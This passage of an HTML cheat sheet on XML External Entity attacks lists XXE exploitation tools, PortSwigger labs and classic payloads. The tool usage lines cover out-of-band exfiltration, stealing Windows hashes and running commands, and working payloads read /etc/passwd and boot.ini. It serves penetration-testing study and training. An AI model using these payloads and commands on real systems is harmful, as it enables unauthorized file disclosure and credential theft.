+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting XXE to perform a deny of service">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#billion-laugh-attack" class="md-nav__link">
+    Billion Laugh Attack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#yaml-attack" class="md-nav__link">
+    Yaml attack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parameters-laugh-attack" class="md-nav__link">
+    Parameters Laugh attack
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-error-based-xxe" class="md-nav__link">
+    Exploiting Error Based XXE
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting Error Based XXE">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#error-based-using-local-dtd-file" class="md-nav__link">
+    Error Based - Using Local DTD File
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#error-based-using-remote-dtd" class="md-nav__link">
+    Error Based - Using Remote DTD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" class="md-nav__link">
+    Exploiting blind XXE to exfiltrate data out-of-band
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting blind XXE to exfiltrate data out-of-band">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-blind-xxe" class="md-nav__link">
+    Basic Blind XXE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-attack-yunusov-2013" class="md-nav__link">
+    XXE OOB Attack (Yunusov, 2013)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-with-dtd-and-php-filter" class="md-nav__link">
+    XXE OOB with DTD and PHP filter
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-oob-with-apache-karaf" class="md-nav__link">
+    XXE OOB with Apache Karaf
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-with-local-dtd" class="md-nav__link">
+    XXE with local DTD
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE with local DTD">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cisco-webex" class="md-nav__link">
+    Cisco WebEx
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#citrix-xenmobile-server" class="md-nav__link">
+    Citrix XenMobile Server
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf-bypasses" class="md-nav__link">
+    WAF Bypasses
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bypass-via-character-encoding" class="md-nav__link">
+    Bypass via character encoding
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-in-java" class="md-nav__link">
+    XXE in Java
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-in-exotic-files" class="md-nav__link">
+    XXE in exotic files
+  </a>
+  
+    <nav class="md-nav" aria-label="XXE in exotic files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-svg" class="md-nav__link">
+    XXE inside SVG
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-soap" class="md-nav__link">
+    XXE inside SOAP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-docx-file" class="md-nav__link">
+    XXE inside DOCX file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-xlsx-file" class="md-nav__link">
+    XXE inside XLSX file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-inside-dtd-file" class="md-nav__link">
+    XXE inside DTD file
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents" class="md-nav__link">
+    Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#disclose-local-file" class="md-nav__link">
+    Disclose local file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disclose-http-response" class="md-nav__link">
+    Disclose HTTP Response:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="xml-external-entity">XML External Entity</h1>
+<blockquote>
+<p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p>
+</blockquote>
+<p><strong>Internal Entity</strong>: If an entity is declared within a DTD it is called as internal entity.  <br />
+Syntax: <code>&lt;!ENTITY entity_name "entity_value"&gt;</code></p>
+<p><strong>External Entity</strong>: If an entity is declared outside a DTD it is called as external entity. Identified by <code>SYSTEM</code>.  <br />
+Syntax: <code>&lt;!ENTITY entity_name SYSTEM "entity_value"&gt;</code></p>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#labs">Labs</a></li>
+<li><a href="#detect-the-vulnerability">Detect the vulnerability</a></li>
+<li><a href="#exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</a></li>
+<li><a href="#classic-xxe">Classic XXE</a></li>
+<li><a href="#classic-xxe-base64-encoded">Classic XXE Base64 encoded</a></li>
+<li><a href="#php-wrapper-inside-xxe">PHP Wrapper inside XXE</a></li>
+<li><a href="#xinclude-attacks">XInclude attacks</a></li>
+<li><a href="#exploiting-xxe-to-perform-SSRF-attacks">Exploiting XXE to perform SSRF attacks</a></li>
+<li><a href="#exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</a></li>
+<li><a href="#billion-laugh-attack">Billion Laugh Attack</a></li>
+<li><a href="#yaml-attack">Yaml attack</a></li>
+<li><a href="#parameters-laugh-attack">Parameters Laugh attack</a></li>
+<li><a href="#exploiting-error-based-xxe">Exploiting Error Based XXE</a></li>
+<li><a href="#error-based---using-local-dtd-file">Error Based - Using Local DTD File</a></li>
+<li><a href="#error-based---using-remote-dtd">Error Based - Using Remote DTD</a></li>
+<li><a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</a></li>
+<li><a href="#blind-xxe">Blind XXE</a></li>
+<li><a href="#xxe-oob-attack-yusonov---2013">XXE OOB Attack (Yunusov, 2013)</a></li>
+<li><a href="#xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</a></li>
+<li><a href="#xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</a></li>
+<li><a href="#waf-bypasses">WAF Bypasses</a></li>
+<li><a href="#bypass-via-character-encoding">Bypass via character encoding</a></li>
+<li><a href="#xxe-in-java">XXE in Java</a></li>
+<li><a href="#xxe-in-exotic-files">XXE in exotic files</a></li>
+<li><a href="#xxe-inside-svg">XXE inside SVG</a></li>
+<li><a href="#xxe-inside-soap">XXE inside SOAP</a></li>
+<li><a href="#xxe-inside-docx-file">XXE inside DOCX file</a></li>
+<li><a href="#xxe-inside-xlsx-file">XXE inside XLSX file</a></li>
+<li><a href="#xxe-inside-dtd-file">XXE inside DTD file</a></li>
+<li><a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a></li>
+</ul>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/staaldraad/xxeserv">xxeftp</a> - A mini webserver with FTP support for XXE payloads
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">sudo</span> <span class="p">./</span><span class="n">xxeftp</span> <span class="n">-uno</span> <span class="n">443</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">./</span><span class="n">xxeftp</span> <span class="n">-w</span> <span class="n">-wps</span> <span class="n">5555</span>
+</code></pre></div></li>
+<li><a href="https://github.com/lc/230-OOB">230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via <a href="http://xxe.sh/">http://xxe.sh/</a>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">230</span><span class="p">.</span><span class="n">py</span> <span class="n">2121</span>
+</code></pre></div></li>
+<li><a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Enumerating /etc directory in HTTPS application:</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="n">-path</span><span class="p">=/</span><span class="n">etc</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-ssl</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c"># Enumerating /etc directory using gopher for OOB method:</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="n">-path</span><span class="p">=/</span><span class="n">etc</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-oob</span><span class="p">=</span><span class="n">gopher</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c"># Second order exploitation:</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="n">-path</span><span class="p">=/</span><span class="n">etc</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">vulnreq</span><span class="p">.</span><span class="n">txt</span> <span class="p">--</span><span class="n">2ndfile</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">2ndreq</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c"># Bruteforcing files using HTTP out of band method and netdoc protocol:</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="n">-brute</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">filenames</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-oob</span><span class="p">=</span><span class="n">http</span> <span class="p">-</span><span class="n">-netdoc</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c"># Enumerating using direct exploitation:</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-path</span><span class="p">=/</span><span class="n">etc</span> <span class="p">-</span><span class="n">-direct</span><span class="p">=</span><span class="n">UNIQUEMARK</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="c"># Enumerating unfiltered ports:</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-enumports</span><span class="p">=</span><span class="n">all</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c"># Stealing Windows hashes:</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-hashes</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c"># Uploading files using Java jar:</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-upload</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">uploadfile</span><span class="p">.</span><span class="n">pdf</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="c"># Executing system commands using PHP expect:</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-oob</span><span class="p">=</span><span class="n">http</span> <span class="p">-</span><span class="n">-phpfilter</span> <span class="p">-</span><span class="n">-expect</span><span class="p">=</span><span class="nb">ls</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="c"># Testing for XSLT injection:</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="p">-</span><span class="o">-file</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">req</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-xslt</span>
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="c"># Log requests only:</span>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="n">ruby</span> <span class="n">XXEinjector</span><span class="p">.</span><span class="n">rb</span> <span class="p">-</span><span class="n">-logger</span> <span class="p">-</span><span class="n">-oob</span><span class="p">=</span><span class="n">http</span> <span class="p">-</span><span class="n">-output</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">out</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div></li>
+<li><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">ruby</span> <span class="n">server</span><span class="p">.</span><span class="n">rb</span>
+</code></pre></div></li>
+<li><a href="https://github.com/whitel1st/docem">docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">./</span><span class="n">docem</span><span class="p">.</span><span class="n">py</span> <span class="n">-s</span> <span class="n">samples</span><span class="p">/</span><span class="n">xxe</span><span class="p">/</span><span class="n">sample_oxml_xxe_mod0</span><span class="p">/</span> <span class="n">-pm</span> <span class="n">xss</span> <span class="n">-pf</span> <span class="n">payloads</span><span class="p">/</span><span class="n">xss_all</span><span class="p">.</span><span class="n">txt</span> <span class="n">-pt</span> <span class="n">per_document</span> <span class="n">-kt</span> <span class="n">-sx</span> <span class="n">docx</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">./</span><span class="n">docem</span><span class="p">.</span><span class="n">py</span> <span class="n">-s</span> <span class="n">samples</span><span class="p">/</span><span class="n">xxe</span><span class="p">/</span><span class="n">sample_oxml_xxe_mod1</span><span class="p">.</span><span class="n">docx</span> <span class="n">-pm</span> <span class="n">xxe</span> <span class="n">-pf</span> <span class="n">payloads</span><span class="p">/</span><span class="n">xxe_special_2</span><span class="p">.</span><span class="n">txt</span> <span class="n">-kt</span> <span class="n">-pt</span> <span class="n">per_place</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">./</span><span class="n">docem</span><span class="p">.</span><span class="n">py</span> <span class="n">-s</span> <span class="n">samples</span><span class="p">/</span><span class="n">xss_sample_0</span><span class="p">.</span><span class="n">odt</span> <span class="n">-pm</span> <span class="n">xss</span> <span class="n">-pf</span> <span class="n">payloads</span><span class="p">/</span><span class="n">xss_tiny</span><span class="p">.</span><span class="n">txt</span> <span class="n">-pm</span> <span class="n">per_place</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="p">./</span><span class="n">docem</span><span class="p">.</span><span class="n">py</span> <span class="n">-s</span> <span class="n">samples</span><span class="p">/</span><span class="n">xxe</span><span class="p">/</span><span class="n">sample_oxml_xxe_mod0</span><span class="p">/</span> <span class="n">-pm</span> <span class="n">xss</span> <span class="n">-pf</span> <span class="n">payloads</span><span class="p">/</span><span class="n">xss_all</span><span class="p">.</span><span class="n">txt</span> <span class="n">-pt</span> <span class="n">per_file</span> <span class="n">-kt</span> <span class="n">-sx</span> <span class="n">docx</span>
+</code></pre></div></li>
+<li><a href="http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html">otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">python</span> <span class="p">./</span><span class="n">otori</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-clone</span> <span class="p">-</span><span class="n">-module</span> <span class="s2">&quot;G-XXE-Basic&quot;</span> <span class="p">-</span><span class="n">-singleuri</span> <span class="s2">&quot;file:///etc/passwd&quot;</span> <span class="p">-</span><span class="n">-module-options</span> <span class="s2">&quot;TEMPLATEFILE&quot;</span> <span class="s2">&quot;TARGETURL&quot;</span> <span class="s2">&quot;BASE64ENCODE&quot;</span> <span class="s2">&quot;DOCTYPE&quot;</span> <span class="s2">&quot;XMLTAG&quot;</span> <span class="p">-</span><span class="n">-outputbase</span> <span class="s2">&quot;./output-generic-solr&quot;</span> <span class="p">-</span><span class="n">-overwrite</span> <span class="p">-</span><span class="n">-noerrorfiles</span> <span class="p">-</span><span class="n">-noemptyfiles</span> <span class="p">-</span><span class="n">-nowhitespacefiles</span> <span class="p">-</span><span class="n">-noemptydirs</span> 
+</code></pre></div></li>
+</ul>
+<h2 id="labs">Labs</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection">PortSwigger Labs for XXE</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">Exploiting XXE using external entities to retrieve files</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf">Exploiting XXE to perform SSRF attacks</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction">Blind XXE with out-of-band interaction</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities">Blind XXE with out-of-band interaction via XML parameter entities</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages">Exploiting blind XXE to retrieve data via error messages</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">Exploiting XInclude to retrieve files</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">Exploiting XXE via image file upload</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">Exploiting XXE to retrieve data by repurposing a local DTD</a></li>
+<li><a href="https://gosecure.github.io/xxe-workshop">GoSecure workshop - Advanced XXE Exploitation</a> </li>
+</ul>
+<h2 id="detect-the-vulnerability">Detect the vulnerability</h2>
+<p>Basic entity test, when the XML parser parses the external entities the result should contain "John" in <code>firstName</code> and "Doe" in <code>lastName</code>. Entities are defined inside the <code>DOCTYPE</code> element.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cm">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;Doe&quot;&gt;</span><span class="w"> </span>]&gt;
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w"> </span><span class="nt">&lt;userInfo&gt;</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span><span class="nt">&lt;firstName&gt;</span>John<span class="nt">&lt;/firstName&gt;</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">  </span><span class="nt">&lt;lastName&gt;</span><span class="ni">&amp;example;</span><span class="nt">&lt;/lastName&gt;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w"> </span><span class="nt">&lt;/userInfo&gt;</span>
+</code></pre></div>
+<p>It might help to set the <code>Content-Type: application/xml</code> in the request when sending XML payload to the server.</p>
+<h2 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</h2>
+<h3 id="classic-xxe">Classic XXE</h3>
+<p>We try to display the content of the file <code>/etc/passwd</code> </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;<span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="cp">&lt;!DOCTYPE data [</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="cp">&lt;!ELEMENT data (#ANY)&gt;</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="cp">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>]&gt;
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="cp">&lt;!DOCTYPE foo [  </span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="cp">  &lt;!ELEMENT foo ANY &gt;</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="cp">&lt;!DOCTYPE foo [  </span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="cp">  &lt;!ELEMENT foo ANY &gt;</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</code></pre></div>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">&lt;!</span><span class="n">ENTITY</span> <span class="p">%</span> <span class="n">xxe</span> <span class="n">PUBLIC</span> <span class="s2">&quot;Random Text&quot;</span> <span class="s2">&quot;URL&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">&lt;!</span><span class="n">ENTITY</span> <span class="n">xxe</span> <span class="n">PUBLIC</span> <span class="s2">&quot;Any TEXT&quot;</span> <span class="s2">&quot;URL&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="classic-xxe-base64-encoded">Classic XXE Base64 encoded</h3>
